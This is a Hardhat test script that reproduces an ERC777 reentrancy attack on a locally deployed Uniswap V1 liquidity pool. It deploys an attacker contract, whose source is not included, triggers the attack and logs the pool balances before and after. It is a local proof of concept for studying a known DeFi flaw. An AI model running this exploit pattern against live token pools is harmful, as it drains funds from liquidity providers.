const {expect} = require("chai");
const {ethers, network, waffle} = require("hardhat");
require("@nomiclabs/hardhat-waffle");
const util = require("../utils/utils");

const provider = waffle.provider;

describe("reentrancy attack",  function() {
    var deployer, attacker;
    const ercPoolAmount = 100000;
    const ethPoolAmount = 100000;
    const attackEth = 10000;
    var erc1820, erc777, uniV1;

    //Prepares
    before(async function(){
        [deployer, attacker] = await ethers.getSigners();
        //Deploy ERC1820
        erc1820 = await util.deploy1820(deployer);
        //Deploy ERC777
        erc777 = await util.deployErc777(deployer);
        //Deploy Uniswap V1 and add liquidities
        uniV1 = await util.deployUniV1(deployer, erc777);
        //Add liquidity 
        await (await erc777.connect(deployer).mint(deployer.address, ercPoolAmount, [], [])).wait();
        await (await erc777.connect(deployer).approve(uniV1.address, ercPoolAmount)).wait();
        await (await uniV1.connect(deployer).addLiquidity(ercPoolAmount, {value: ethPoolAmount})).wait();
    });
 
    it("reentrancy attack ", async function(){
        // Check liquidity pool count
        let ethPoolBefore = await provider.getBalance(uniV1.address);
        let erc777PoolBefore = await erc777.balanceOf(uniV1.address);
        console.log('Before attack:');
        console.log(`eth pool: ${ethPoolBefore} wei`);
        console.log(`erc777 pool: ${erc777PoolBefore} imBTC`);
        // Attacker deploy attacker contract
        let AttackerContract = await ethers.getContractFactory('AttackerContract', attacker);
        let attackerContract = await AttackerContract.deploy(uniV1.address, erc777.address, erc1820.address);
        await attackerContract.deployed();
        // Attacker allows uniswap to operate his money
        await (await attackerContract.connect(attacker).approveUni(ercPoolAmount)).wait();
        // Attacker trigger attack
        await (await attackerContract.connect(attacker).trigger({value:attackEth})).wait();
        // Result
        let ethPoolAfter = await provider.getBalance(uniV1.address);
        let erc777PoolAfter = await erc777.balanceOf(uniV1.address);
        console.log('After attack:');
        console.log(`eth pool: ${ethPoolAfter} wei`);
        console.log(`erc777 pool: ${erc777PoolAfter} imBTC`);
    });

});


